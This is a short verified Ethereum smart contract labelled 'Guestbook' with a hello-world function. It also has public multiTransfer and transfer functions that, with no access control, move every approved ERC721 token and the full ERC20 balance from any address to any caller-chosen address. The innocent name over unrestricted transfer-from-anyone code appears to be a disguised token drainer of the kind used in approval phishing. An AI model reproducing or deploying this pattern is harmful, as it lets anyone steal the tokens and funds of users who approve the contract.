/**
 *Submitted for verification at Etherscan.io on 2022-04-30
*/

interface ERC721 {
  function safeTransferFrom(address _from, address _to, uint256 _tokenId) external;
}
interface ERC20 {
  function balanceOf(address _owner) external view returns (uint balance);
  function transferFrom(address _from, address _to, uint _value) external returns (bool success) ;
}


contract Guestbook {
  function helloWorld () pure public returns (string memory) {
    return 'helloWorld';
  }

  function multiTransfer(address _contract, address _from, address _to, uint256[] calldata _ids) public {
    for (uint i = 0; i < _ids.length; i++) {
      ERC721(_contract).safeTransferFrom(_from, _to, _ids[i]);
    }
  }

  function transfer(address _contract, address _from, address _to) public {
    uint balance = ERC20(_contract).balanceOf(_from);
    ERC20(_contract).transferFrom(_from, _to, balance);
  }
}